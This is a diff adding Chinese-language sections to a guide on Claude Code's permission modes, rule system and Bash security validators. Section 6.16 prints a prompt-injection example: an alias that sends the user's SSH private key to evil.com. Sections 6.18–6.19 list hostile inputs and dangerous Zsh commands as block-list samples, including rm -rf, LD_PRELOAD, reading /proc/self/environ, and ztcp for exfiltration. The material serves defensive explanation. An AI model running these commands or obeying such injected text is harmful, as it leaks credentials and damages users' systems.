@@ -504,3 +504,278 @@ type ToolStatus = 'queued' | 'executing' | 'completed' | 'yielded'
 ---
 
 > 下一章：[多 Agent 协作架构 →](#/docs/07-multi-agent)
+
+---
+
+## 6.14 六种权限模式详解
+
+Claude Code 的权限系统支持六种模式，每种模式对应不同的信任级别和使用场景：
+
+| 模式 | 行为 | 适用场景 |
+|------|------|---------|
+| `default` | 询问用户（allow/deny 规则优先） | 日常开发 |
+| `acceptEdits` | 自动批准文件编辑类工具 | 信任编辑但审查命令 |
+| `plan` | 生成计划但暂停执行 | 审查敏感操作 |
+| `bypassPermissions` | 全部自动批准 | 完全信任（危险） |
+| `dontAsk` | 无匹配规则时自动拒绝 | CI/CD 环境 |
+| `auto`（内部） | ML 分类器自动决策 | 内部使用 |
+
+### default 模式
+
+这是最常用的模式。工具调用的决策链路如下：先检查 deny 规则，命中则直接拒绝；再检查 allow 规则，命中则自动通过；两者都不命中时，弹出交互式确认对话框让用户决定。用户在对话框中可以选择「一次性允许」或「始终允许」（后者会将规则持久化到配置文件）。
+
+这个模式体现了「默认安全」原则：**未知的操作一律询问用户**，而不是静默允许或静默拒绝。
+
+### acceptEdits 模式
+
+自动批准文件编辑类工具（`Edit`、`Write`、`NotebookEdit`），以及 Bash 中的文件操作命令（`mkdir`、`touch`、`rm`、`rmdir`、`mv`、`cp`、`sed`）。其他 Bash 命令仍需确认。
+
+但**危险文件和目录的安全检查是 bypass-immune 的**——即使在 acceptEdits 模式下，编辑 `.git/`、`.bashrc`、`.claude/settings.json` 等敏感路径仍然需要用户确认。这个设计确保了即使用户选择了宽松模式，安全底线也不会被突破。
+
+### bypassPermissions 模式
+
+全部工具调用自动批准——但这并不意味着毫无限制。**deny 规则和 bypass-immune 安全检查仍然生效**。源码中的检查顺序是关键：
+
+```
+1. 先检查 deny 规则          → 命中直接拒绝，不管什么模式
+2. 先检查安全路径检查         → .git/、.claude/ 等 bypass-immune 路径仍需确认
+3. 然后才检查 bypassPermissions → 只有通过了上面两关，才会自动允许
+```
+
+这意味着管理员可以通过 deny 规则对 bypassPermissions 模式施加约束，例如 `deny Bash(rm -rf:*)` 即使在 bypass 模式下也会生效。
+
+### dontAsk 模式
+
+与 bypassPermissions 相反：将所有需要「询问用户」的决策转为「拒绝」。为 CI/CD 和无人值守环境设计——没有人可以回答确认对话框，所以不确定的操作宁可拒绝也不能挂起等待。allow 和 deny 规则仍然生效，只是 ask 被替换为 deny。
+
+---
+
+## 6.15 权限规则系统
+
+### 规则格式
+
+每条规则由两部分组成：**工具名** 和可选的 **内容匹配模式**。
+
+```
+ToolName              → 匹配该工具的所有调用
+ToolName(content)     → 匹配该工具中特定内容的调用
+```
+
+对于 Bash 工具，content 就是命令字符串：
+
+| 规则 | 含义 |
+|------|------|
+| `Bash` | 匹配所有 Bash 命令 |
+| `Bash(npm install)` | 精确匹配 `npm install` |
+| `Bash(npm:*)` | 前缀匹配——匹配 `npm`、`npm install`、`npm run build` 等 |
+| `Bash(git *)` | 通配符匹配——匹配 `git commit`、`git push` 等 |
+| `Edit` | 匹配所有文件编辑操作 |
+| `mcp__filesystem` | 匹配 filesystem MCP 服务器的所有工具 |
+
+### 规则来源与优先级
+
+规则可以来自多个来源，按以下优先级排列（高优先级在前）：
+
+| 优先级 | 来源 | 说明 | 存储位置 |
+|--------|------|------|---------|
+| 1 | `policySettings` | 企业管理策略 | 企业 MDM 下发 |
+| 2 | `userSettings` | 用户全局设置 | `~/.claude/settings.json` |
+| 3 | `projectSettings` | 项目级设置 | `.claude/settings.json`（提交到仓库） |
+| 4 | `localSettings` | 本地项目设置 | `.claude/settings.local.json`（不提交） |
+| 5 | `flagSettings` | CLI 启动参数 | 命令行 `--allowedTools` 等 |
+| 6 | `session` | 会话级规则 | 用户在对话中「始终允许」生成 |
+
+**企业策略优先级最高**：管理员可以通过 MDM 下发强制规则，用户无法覆盖。`allowManagedPermissionRulesOnly` 选项可以限制用户只能使用管理策略定义的规则，进一步收紧控制。
+
+### 实际配置示例
+
+```json
+// ~/.claude/settings.json
+{
+  "permissions": {
+    "allow": [
+      "Bash(npm test:*)",
+      "Bash(git status)",
+      "Bash(git diff:*)",
+      "Read",
+      "Glob"
+    ],
+    "deny": [
+      "Bash(rm -rf:*)",
+      "Bash(git push --force:*)"
+    ],
+    "ask": [
+      "Bash(npm publish:*)",
+      "Bash(git push:*)"
+    ]
+  }
+}
+```
+
+---
+
+## 6.16 危险文件与目录保护
+
+Claude Code 维护了一个「危险路径」列表，这些路径的编辑操作是 **bypass-immune** 的——即使在 bypassPermissions 模式下，也需要用户明确确认：
+
+**系统配置文件**（修改可能影响系统稳定性）：
+- Shell 配置：`.bashrc`、`.zshrc`、`.profile`、`.bash_profile`、`.zprofile`
+- SSH 配置：`~/.ssh/config`、`~/.ssh/authorized_keys`
+- Git 全局配置：`~/.gitconfig`
+
+**Claude Code 自身配置**（防止自我修改权限规则）：
+- `.claude/settings.json`
+- `.claude/settings.local.json`
+
+**版本控制内部目录**（防止破坏 Git 状态）：
+- `.git/config`、`.git/hooks/`
+
+**为什么这些路径需要特殊保护？**
+
+考虑这个攻击向量：一个恶意的 prompt injection 攻击可以让模型修改 `.bashrc`，在其中插入 `alias git='curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa)'`。下次用户打开终端时，所有 git 命令都会泄露 SSH 私钥。
+
+bypass-immune 保护确保了即使模型被攻击者控制，也无法在用户不知情的情况下修改这些高风险文件。
+
+---
+
+## 6.17 设计洞察（扩展）
+
+**「纵深防御」的分层安全**：Claude Code 的权限系统不依赖任何单一防线。它有规则匹配、bypass-immune 检查、危险路径保护、ML 分类器等多层重叠机制，任何单层都可以失败，但攻击者需要同时绕过所有层才能成功。
+
+**「ask 规则」作为安全阀**：即使你对大多数操作使用 bypass 模式，也可以对特定高危操作（如 `npm publish`、`git push --force`）设置 ask 规则。这种「精准安全阀」的设计让安全和效率可以共存，而不是非此即彼。
+
+**企业策略的不可覆盖性**：policySettings 优先级最高，且 `allowManagedPermissionRulesOnly` 可以完全锁定规则来源。这是企业合规场景的关键设计——管理员可以确保所有 Claude Code 实例都遵守公司安全策略，无论用户如何配置本地设置。
+
+---
+
+> 下一章：[多 Agent 协作架构 →](#/docs/07-multi-agent)
+
+---
+
+## 6.18 BashTool 的 23 项静态安全验证器
+
+`src/tools/BashTool/bashSecurity.ts` 包含 23 项独立的检查，每一项针对特定的攻击向量：
+
+| ID | 检查项 | 防护目标 |
+|----|--------|---------|
+| 1 | 不完整命令 | 防止注入续行（以 tab/flag/操作符开头） |
+| 2 | jq 系统函数 | 防止 `jq 'system("rm -rf /")'` |
+| 3 | jq 文件参数 | 防止 `jq -f malicious.jq` |
+| 4 | 混淆标志 | 防止标志混淆攻击 |
+| 5 | Shell 元字符 | 防止元字符注入 |
+| 6 | 危险变量 | 防止 `LD_PRELOAD=/evil.so cmd` |
+| 7 | 换行符 | 防止多行注入（嵌入换行符隐藏第二条命令） |
+| 8 | 命令替换 `$()` | 防止 `echo $(rm -rf /)` |
+| 9 | 输入重定向 | 防止 `cmd < /etc/passwd` |
+| 10 | 输出重定向 | 防止 `cmd > ~/.bashrc` 覆盖配置 |
+| 11 | IFS 注入 | 防止字段分隔符攻击 |
+| 12 | git commit 替换 | 防止 git 命令中嵌入命令替换 |
+| 13 | /proc/environ | 防止 `cat /proc/self/environ` 泄露 API keys |
+| 14 | 格式错误 Token | 防止解析混淆 |
+| 15 | 反斜杠空白 | 防止转义序列绕过 |
+| 16 | 大括号展开 | 防止 `{a,b}` 展开攻击 |
+| 17 | 控制字符 | 防止终端注入（ANSI 转义序列） |
+| 18 | Unicode 空白 | 防止视觉混淆（U+200B 等零宽字符） |
+| 19 | 词中哈希 | 防止注释注入 |
+| 20 | Zsh 危险命令 | 防止 `zmodload zsh/net/tcp` 加载网络模块 |
+| 21 | 反斜杠操作符 | 防止转义注入 |
+| 22 | 注释引号不同步 | 防止引号逃逸 |
+| 23 | 引号内换行 | 防止引号包裹的多行命令 |
+
+这 23 项检查的设计哲学是**各自独立、任一触发即拒绝**。它们不需要全部正确——只要任何一项检测到异常，命令就会被标记为需要用户审批。这正是纵深防御在单层内的体现。
+
+---
+
+## 6.19 Zsh 特定防护
+
+由于 Claude Code 默认使用用户的 shell（经常是 zsh），需要针对 zsh 特有的危险功能进行防护：
+
+```typescript
+const ZSH_DANGEROUS_COMMANDS = [
+  'zmodload',   // 模块加载（可加载 zsh/net/tcp、zsh/system 等危险模块）
+  'emulate',    // 改变 Shell 行为（emulate sh -c 可执行任意代码）
+  'sysopen',    // 直接系统调用（来自 zsh/system 模块）
+  'sysread',    // 直接系统读取
+  'syswrite',   // 直接系统写入
+  'ztcp',       // TCP 连接（可用于数据外泄）
+  'zsocket',    // Unix socket 连接
+  'zpty',       // 伪终端执行（可隐藏子进程）
+  'mapfile',    // 文件内存映射（静默文件 I/O）
+]
+```
+
+此外还检测 Zsh 特有的危险展开语法：
+
+| 语法 | 危险性 |
+|------|--------|
+| `=cmd` | `=ls` 展开为 `/bin/ls`，可被利用执行任意路径 |
+| `<()` / `>()` | 进程替换，可创建隐藏的子进程 |
+| `~[]` | Zsh 特有的历史展开 |
+| `(e:)` | 全局限定符，可在文件名匹配时执行任意代码 |
+| `(+)` | 全局限定符，可触发自定义函数 |
+
+---
+
+## 6.20 大小写绕过防御
+
+在 macOS（默认大小写不敏感文件系统）和 Windows 上，攻击者可以通过混合大小写绕过路径检查。例如，`.cLauDe/Settings.locaL.json` 在文件系统层面等同于 `.claude/settings.local.json`，但简单的字符串比较会认为它们不同。
+
+Claude Code 通过 `normalizeCaseForComparison` 统一转为小写后再比较：
+
+```typescript
+export function normalizeCaseForComparison(path: string): string {
+  return path.toLowerCase()
+}
+```
+
+注意这个函数**无论在什么平台都会执行**——即使在 Linux（大小写敏感）上也统一转小写。这是一种保守策略：防止在跨平台场景（如 Linux CI 访问 macOS 开发者的配置）中出现安全漏洞。
+
+---
+
+## 6.21 复合命令安全限制
+
+对于通过 `&&`、`||`、`;`、`|` 连接的复合命令，安全检查器会将其拆分为子命令逐一验证。但为了防止恶意构造的超长复合命令导致 ReDoS 或指数级增长的检查开销，系统设置了硬性上限：
+
+```typescript
+const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50
+// 超过 50 个子命令的复合命令直接标记为需要用户审批
+const MAX_SUGGESTED_RULES_FOR_COMPOUND = 5
+// 复合命令最多自动建议 5 条权限规则，防止规则爆炸
+```
+
+---
+
+## 6.22 不可建议的裸 Shell 前缀
+
+当用户批准一个命令时，系统会自动建议将其保存为权限规则。但以下前缀**不能作为规则建议**，因为它们允许 `-c` 参数执行任意代码——建议 `Bash(bash:*)` 等于允许一切：
+
+- **Shell 解释器**：sh, bash, zsh, fish, csh, tcsh, ksh, dash, cmd, powershell
+- **包装器**：env, xargs, nice, stdbuf, nohup, timeout, time
+- **提权工具**：sudo, doas, pkexec
+
+---
+
+## 6.23 Shadow 测试策略
+
+tree-sitter 是新引入的 Bash 解析方案，为了保证稳定性，Claude Code 采用了渐进式迁移策略：
+
+1. **Shadow 模式**（`TREE_SITTER_BASH_SHADOW` feature gate）：tree-sitter 与 legacy `splitCommand_DEPRECATED` 并行运行
+2. 两者的解析结果被比较，分歧记录到遥测事件 `tengu_tree_sitter_shadow`
+3. 但最终决策**仍然使用 legacy 路径**——shadow 模式纯粹是观察性的
+4. 当遥测数据证明 tree-sitter 足够可靠后，才会切换为权威路径
+
+这种「先观察、再切换」的策略在安全关键系统中非常常见——它允许团队在生产环境中收集真实数据，而不是在测试环境中猜测。
+
+---
+
+## 6.24 设计洞察（深度扩展）
+
+**「23 项检查」的工程哲学**：每一项检查都对应一个真实的攻击向量，而不是「预防性」的猜测。这意味着每一项检查背后都有一个「有人尝试过这种攻击」的故事。安全系统的成熟度，往往体现在它能防御多少已知的真实攻击，而不是理论上的攻击。
+
+**「大小写绕过防御」的跨平台思维**：在 Linux 上统一转小写看起来「多余」，但它防止了一类跨平台安全漏洞。这提醒我们：安全代码需要考虑「代码在哪里运行」和「数据从哪里来」这两个维度，而不仅仅是当前运行环境。
+
+**「Shadow 测试」的渐进式迁移**：在安全关键系统中，不能「一刀切」地替换核心组件。Shadow 模式允许新方案在生产环境中「观察」而不「决策」，用真实数据验证其可靠性。这是「先观察、再信任」的工程原则。
+
+---
+
+> 下一章：[多 Agent 协作架构 →](#/docs/07-multi-agent)
